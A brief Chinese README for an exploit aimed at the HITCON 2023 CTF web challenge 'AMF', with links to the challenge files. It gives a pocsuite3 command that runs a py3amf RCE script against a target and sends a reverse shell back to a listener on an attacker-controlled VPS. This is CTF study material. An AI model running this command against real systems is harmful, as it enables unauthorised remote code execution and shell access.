# HITCON-2023-AMF-ExP
HITCON 2023 AMF Exp

### 题目来源

+ https://github.com/hitconctf/ctf2023.hitcon.org/releases/download/v1.0.0/amf-39c56ff09aebf12f7ae39009b14481a96f03c2b5.zip

+ https://github.com/sajjadium/ctf-archives/tree/a7ddcef72a666bab10162fc4f9a356a49797592d/ctfs/HITCON/2023/Quals/web/AMF

### ExP

本 ExP 基于 [Pocsuite3](https://github.com/knownsec/pocsuite3) 编写

1.使用 VPS 开启监听

2.执行

```bash
pocsuite3 -u 目标地址 -r py3amf_rce.py --shell --lhost VPSIP --lport VPS端口
```

3.查看反弹结果
